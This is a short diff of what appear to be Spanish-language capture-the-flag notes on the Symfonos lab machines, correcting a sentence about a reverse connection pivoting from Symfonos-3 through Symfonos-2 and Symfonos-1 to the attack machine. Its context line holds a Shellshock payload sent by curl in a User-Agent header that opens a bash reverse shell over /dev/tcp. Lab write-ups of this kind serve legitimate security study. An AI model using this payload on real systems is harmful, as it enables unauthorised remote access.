@@ -808,5 +808,5 @@ sudo proxychains curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.3.2
 ![[Pasted image 20240622204920.png]]
 
 `Maquina Attack`
-efectivamente. la conexion 
+efectivamente. la conexión ha viajado desde  `Symfonos-3` > `Symfonos-2` > `Symfonos-1` > `Attack`
 ![[Pasted image 20240622205127.png]]
